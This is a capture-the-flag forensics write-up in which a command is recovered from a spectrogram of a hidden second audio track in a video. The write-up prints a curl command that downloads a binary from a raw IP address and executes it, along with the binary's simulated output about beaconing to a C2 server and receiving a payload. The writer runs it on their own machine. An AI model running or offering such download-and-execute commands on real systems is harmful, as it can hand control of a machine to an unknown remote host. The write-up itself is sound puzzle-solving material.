## Sorry, you're NOT a sigma!
The lion says solve this challenge. You seem to have a good **track** record at doing so.

SHA256: 66591540e5dd8e925128513d1ca0810118350c822429e4e8c1d1a98b7d8924f3

## Solution

Because the word track is bolded, I decide to take a look at the files audio tracks by running `ffmpeg -i lion.mp4`, which showed me this:

```bash
  Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 48000 Hz, stereo, fltp, 128 kb/s (default)
    Metadata:
      handler_name    : SoundHandler
      vendor_id       : [0][0][0][0]
  Stream #0:2(und): Audio: aac (LC) (mp4a / 0x6134706D), 22050 Hz, stereo, fltp, 121 kb/s
    Metadata:
      handler_name    : SoundHandler
      vendor_id       : [0][0][0][0]
```

This means that there are two audio files. I extract the second one using `ffmpeg -i lion.mp4 -map 0:a:1 -acodec pcm_s16le audio2.wav`. Listening to audio2.wav, it sounds like weird distorted alien noises, which prompts me to open the file in Audacity. 

Opening audio2.wav in Audacity and viewing as Spectrogram showed me this:
![spectrogram](spectrogram.png)

```bash
curl -s http://23.179.17.40:6969/roar -o /tmp/roar && chmod +x /tmp/roar && /tmp/roar
````

Running this command in my terminal gives me the flag:

```c
dev@dev:~$ curl -s http://23.179.17.40:6969/roar -o /tmp/roar && chmod +x /tmp/roar && /tmp/roar
[*] Initializing beacon...
[*] Beacon attempt 1: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 2: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 3: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 4: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 5: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 6: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 7: phoning home...
[+] Beacon successfully reached C2 on attempt 7.
[*] Downloading payload...
[*] Decrypting response...
[+] Flag received:
CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}
```

FLAG: `CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}`